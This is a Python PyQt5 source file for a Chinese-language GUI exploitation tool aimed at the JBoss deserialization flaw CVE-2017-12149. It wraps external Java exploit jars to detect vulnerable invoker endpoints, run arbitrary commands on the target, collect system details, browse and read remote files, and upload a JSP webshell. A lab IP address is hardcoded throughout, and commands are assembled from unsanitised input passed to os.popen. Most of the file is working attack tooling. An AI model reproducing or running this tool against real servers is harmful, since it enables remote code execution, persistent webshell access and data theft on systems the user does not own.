import sys
import time
import os
import base64
import logging
import subprocess
from threading import Thread
from PyQt5.QtWidgets import QApplication, QMainWindow

from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtGui import *
from PyQt5.QtCore import Qt
from PyQt5.QtWidgets import QApplication, QMainWindow,QWidget
from PyQt5.QtWidgets import QDesktopWidget, QMessageBox
from time import sleep
from untitled import Ui_JBossDeserialVulnTool
from portscanner import PortScan
from detect import VulDetect
from hostscan import *

#logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S",filename="log/logs", filemode="a")

class Main(QtWidgets.QWidget,Ui_JBossDeserialVulnTool):
    def __init__(self):
        super(Main, self).__init__()
        self.setFixedSize(800, 600)
        self.setupUi(self)
        self.center()
        #self.tree = QtWidgets.QTreeWidget()
        self.portscan = PortScan()
        self.vuldetect = VulDetect()
        self.logger = Thread(target=self.record_logs)
        self.logger.setDaemon(True)
        self.logger.start()

    def CPortScan(self):
        ip = self.LEHost.text()
        if ip:
            self.tBPortScan.append(time.strftime("[%Y-%m-%d %H:%M:%S] ", time.localtime())
                                    + " [*] 已选择常规端口扫描")
            cost_microsecond = self.portscan.CPortScan(ip)
            self.tBPortScan.append("扫描完成，总计用时：" + str(cost_microsecond) + "微秒")
        else:
            self.tBPortScan.append(time.strftime("[%Y-%m-%d %H:%M:%S] ", time.localtime())
                                    + " [*] 扫描失败，未输入ip地址")

    def FPortScan(self):
        ip = self.LEHost.text()
        if ip:
            self.tBPortScan.append(time.strftime("[%Y-%m-%d %H:%M:%S] ", time.localtime())
                                   + " [*] 已选择全端口扫描")
            cost_second = self.portscan.FPortScan(ip)
            self.tBPortScan.append("扫描完成，总计用时：" + str(cost_second) + "秒")
        else:
            self.tBPortScan.append(time.strftime("[%Y-%m-%d %H:%M:%S] ", time.localtime())
                                   + " [*] 扫描失败，未输入ip地址")

    def record_logs(self):
        while True:
            if self.portscan is None:
                time.sleep(1)
            else:
                self.tBPortScan.append(self.portscan._LOGS.get())

    def center(self):
        qr = self.frameGeometry()
        cp = QDesktopWidget().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())

    def keyPressEvent(self, e):
        if e.key() == Qt.Key_Escape:
            self.close()

    def closeEvent(self, event):
        reply = QMessageBox.question(self, '离开',
                                     "你确定要离开？", QMessageBox.Yes |
                                     QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            event.accept()
        else:
            event.ignore()

    def PortClear(self):
        self.tBPortScan.clear()

    def DetectClear(self):
        self.tBDetect.clear()

    def CmdClear(self):
        self.tBcmdresult.clear()

    def InfoClear(self):
        self.tBInfoShower.clear()

    def ShellClear(self):
        self.lEUrl.clear()
        self.tBShowShell.clear()

    def SendPaylaod2Detect(self):
        str1 = 'java -jar verify_CVE-2017-12149.jar '
        ip = self.LEHost.text()
        port = self.PortlineEdit.text()
        cmd = str1 + 'http://' + ip + ':' + port
        self.tBDetect.append('=====================================')
        self.tBDetect.append('正在检测主机：'+ 'http://' + ip + ':' + port+'/invoker/readonly是否存在反序列化漏洞...')
        sleep(3)
        r = os.popen(cmd)
        result = r.read()
        self.tBDetect.append('检测完毕，结果如下：')
        self.tBDetect.append(result.strip())
        judge_result = result.strip()
        if judge_result.find("vuln")!= -1:
            self.tBDetect.append('目标服务器存在反序列化漏洞，注入点为/invoker/readonly\n=====================================')
        else:
            self.tBDetect.append('目标服务器不存在/invoker/readonly注入点\n=====================================')

        self.tBDetect.append('正在检测主机：' + 'http://' + ip + ':' + port + '/invoker/JMXInvokerServlet是否存在反序列化漏洞...')
        str2 = 'java -jar detect.jar '
        cmd2 = str2 + 'http://' + ip + ':' + port
        sleep(3)
        r2 = os.popen(cmd2)
        result2 = r2.read()
        self.tBDetect.append(result2.strip())
        if result2.find("200") != -1:
            self.tBDetect.append('目标服务器存在反序列化漏洞，注入点为/invoker/JMXInvokerServlet\n=====================================')
        else:
            self.tBDetect.append('目标服务器不存在/invoker/JMXInvokerServlet注入点\n=====================================')


    def CmdExec(self):
        ter_str = 'java -jar terminal.jar'
        cmd = self.cmdlineEdit.text()
        ip = self.LEHost.text()
        port = self.PortlineEdit.text()
        ter_cmd = ter_str + ' "'+ cmd + '" ' +'http://' + ip + ':' + port
        #ter_cmd = "java -jar terminal.jar"+ ' "'+ cmd + '" '+ "http://192.168.134.130:8080"
        self.tBcmdresult.append('正在连接虚拟终端 ... ...')
        self.tBcmdresult.append('=====================================')
        r = os.popen(ter_cmd)
        ter_result = r.read()
        self.tBcmdresult.append(ter_result.replace('[L291919]\n', ' '))



    def GetInfo(self):
        ter_str = 'java -jar terminal.jar'
        ip = self.LEHost.text()
        port = self.PortlineEdit.text()
        ter_cmd = ter_str + ' "lsb_release -a" ' + 'http://' + ip + ':' + port
        ter_cmd_1 = "java -jar terminal.jar" + ' "lsb_release -a" ' + "http://192.168.134.130:8080"
        self.tBInfoShower.append('正在获取主机信息 ... ...')
        ter_cmd_0 = "java -jar terminal.jar" + ' "whoami" ' + "http://192.168.134.130:8080"
        r = os.popen(ter_cmd_0)
        ter_result_0 = r.read()
        str_0= ter_result_0.replace('[L291919]\n', ' ')
        self.tBInfoShower.append('当前用户登录身份:' + str_0.strip())
        self.tBInfoShower.append('=====================================')
        r = os.popen(ter_cmd_1)
        ter_result_1 = r.read()
        self.tBInfoShower.append(ter_result_1.replace('[L291919]\n', ' '))
        self.tBInfoShower.append('=====================================')
        self.tBInfoShower.append('主机内核信息:')

        ter_cmd_2 = "java -jar terminal.jar" + ' "uname -a" ' + "http://192.168.134.130:8080"
        r = os.popen(ter_cmd_2)
        ter_result_2 = r.read()
        self.tBInfoShower.append(ter_result_2.replace('[L291919]\n', ' '))
        str_blank = ter_result_2.replace('[L291919]\n', ' ')
        a = str_blank.split(' ')
        self.tBInfoShower.append("Operate System:     "+ a[1])
        self.tBInfoShower.append("OS Version:     "+ a[3])
        self.tBInfoShower.append("OS Architeture:     " + a[12])
        self.tBInfoShower.append('=====================================')
        self.tBInfoShower.append('主机CPU信息:')

        ter_cmd_3 = "java -jar terminal.jar" + ' "cat /proc/cpuinfo" ' + "http://192.168.134.130:8080"
        r = os.popen(ter_cmd_3)
        ter_result_3 = r.read()
        str3 = ter_result_3.replace('[L291919]\n', ' ')
        self.tBInfoShower.append(str3.strip())

    def GenShell(self):
        # shell = 'ztLKx9fWt/u0rg=='
        # #base64.b64decode(shell)
        # self.tBShowShell.append(str(base64.b64decode(shell),encoding = "ascii"))
        #filename, _ = QFileDialog.getOpenFileName(self);
        f = open('webshell.jsp', 'r')
        shellcode = f.read()
        f.close()
        self.tBShowShell.append(shellcode)

    def SendShell(self):
        f = open('webshell.jsp', 'r')
        shellcode = f.read()
        uri = self.lEUrl.text()
        ter_cmd_4 = "java -jar webshell.jar" + " http://192.168.134.130:8080 " + uri
        r = os.popen(ter_cmd_4)
        self.tBShowShell.append("文件已成功上传,请连接测试......")
        f.close()

    #def

    # def File_Search(self, item,column):
    #     tmp_cmd_1 = "java -jar terminal.jar" + " ls /" + item.text(0) + " http://192.168.134.130:8080"
    #     r = os.popen(tmp_cmd_1)
    #     res = r.read().strip()



    def GetFileUrl(self,item,column):
        str = self.TrimUrl(item,column)
        self.tBShowUrl.clear()
        self.tBShowUrl.append("/"+str)



    def TrimUrl(self,item,column):
        t = []
        str = '/'
        while(item.text(0)!= '/'):
            t.append(item.text(0).strip())
            item =item.parent()

        t.reverse()
        return str.join(t)


    def Filehandler(self, item, column):
        #print(item.text(0),column) #点击的item的名称
        #tmp_cmd = "java -jar terminal.jar" + ' "ls -l /' + item.text(0).strip() + '"' + " http://192.168.134.130:8080"
        tmp_cmd = "java -jar terminal.jar" + ' "ls -l /' + self.TrimUrl(item,column).strip() + '"' + " http://192.168.134.130:8080"
        print(tmp_cmd)
        print(self.TrimUrl(item, column))
        #print(tmp_cmd) # 打印拼接之后的命令
        r = os.popen(tmp_cmd)
        res = r.read().strip()
        a = res.split('\n')
        b = []
        c = []
        d = []
        e = []
        f = []
        for i in range(0, len(a)): # 挑选出文件夹/文件
            if(a[i].startswith('d')):
                b.append(a[i])
            if (a[i].startswith('-') | a[i].startswith('l')):
                e.append(a[i])

        for i in range(0, len(b)):
            r_index = b[i].rindex(' ') # 筛选文件夹
            c.append(QTreeWidgetItem(item))
            c[i].setText(0, b[i][r_index:])
            #c[i].setIcon(0, QIcon('images/folder.png'))
            #print(b[i][r_index:])
            #print(c[i].text(0))

        for i in range(0, len(c)): # 配置文件夹item
            d.append(QTreeWidgetItem(c[i]))
            d[i].setText(0, "..")

        for i in range(0,len(e)): # 文件
            rr_index = e[i].rindex(' ')
            f.append(QTreeWidgetItem(item))
            f[i].setText(0, e[i][rr_index:])

        #print(item.parent().text(0)) #打印此item的爸爸的名称

        QApplication.processEvents()


    def SetFileRoot(self):

        ter_cmd_5 = "java -jar terminal.jar" + ' "ls -l" ' + "http://192.168.134.130:8080"
        r = os.popen(ter_cmd_5)
        ter_result_5 = r.read().strip()
        a = ter_result_5.split('\n')
        b =[]
        c =[]
        d =[]
        e =[]
        f =[]
        tree = self.tWFile

        root = QTreeWidgetItem(tree)
        root.setText(0, "/")

        for i in range(0, len(a)): # 获取命令结果
            if(a[i].startswith('d')):
                b.append(a[i])
            if(a[i].startswith('-')|a[i].startswith('l')):
                e.append(a[i])

        for i in range(0, len(b)): # 文件夹
            r_index = b[i].rindex(' ')
            c.append(QTreeWidgetItem(root))
            c[i].setText(0, b[i][r_index:])
            #print(c[i].text(0))#打印文件夹名称

        for i in range(0,len(c)): # 配置文件夹item
            d.append(QTreeWidgetItem(c[i]))
            d[i].setText(0, "..")

        for i in range(0,len(e)): # 文件
            rr_index = e[i].rindex(' ')
            f.append(QTreeWidgetItem(root))
            f[i].setText(0, e[i][rr_index:])

        QApplication.processEvents()

        tree.itemDoubleClicked.connect(self.Filehandler)
        tree.itemDoubleClicked.connect(self.GetFileUrl)
        #tree.itemDoubleClicked.connect(self.TrimUrl)

        #     c[i].click.connect(filehandler(self,c[i]))

    def ShowFileContent(self):
        self.tBFileCon.clear()
        str = self.tBShowUrl.toPlainText()
        cmd = "java -jar terminal.jar" + ' "cat ' +  str + '" '+ "http://192.168.134.130:8080"
        r = os.popen(cmd)
        file_result = r.read()
        file_content = file_result.replace('[L291919]\n', ' ')
        self.tBFileCon.append(file_content)

    #def checkfile(self):




    # def GetFileTree(self):
    #     root = QTreeWidgetItem(self.treeWidget)
    #     root.setText(0, "root")
    #     child1 = QTreeWidgetItem(root)
    #     child1.setText(0, "child1")
    #     child1.setText(1, "name")
    #     child2 = QTreeWidgetItem(root)
    #     child2.setText(0, "child2")
    #     child2.setText(1, "name")
    #     child3 = QTreeWidgetItem(child2)
    #     child3.setText(0, "child3")
    #     child3.setText(1, "name")
    #     child4 = QTreeWidgetItem(child3)
    #     child4.setText(0, "child4")
    #     child4.setText(1, "name")



def main():
    app = QtWidgets.QApplication(sys.argv)
    main = Main()
    main.show()
    main.pBCommonPort.clicked.connect(main.CPortScan)
    main.pBAllPort.clicked.connect(main.FPortScan)
    main.pBClearAll.clicked.connect(main.PortClear)
    main.pBDSend.clicked.connect(main.SendPaylaod2Detect)
    main.pBDClear.clicked.connect(main.DetectClear)
    main.pBCmdExec.clicked.connect(main.CmdExec)
    main.pBCmdClear.clicked.connect(main.CmdClear)
    main.pBGetInfo.clicked.connect(main.GetInfo)
    main.pBInfoClear.clicked.connect(main.InfoClear)
    main.pBGenShell.clicked.connect(main.GenShell)
    main.pBSendShell.clicked.connect(main.SendShell)
    main.pBShellClear.clicked.connect(main.ShellClear)
    main.pBFile.clicked.connect(main.SetFileRoot)
    main.pBShowFile.clicked.connect(main.ShowFileContent)

    sys.exit(app.exec_())

if __name__ == '__main__':
    main()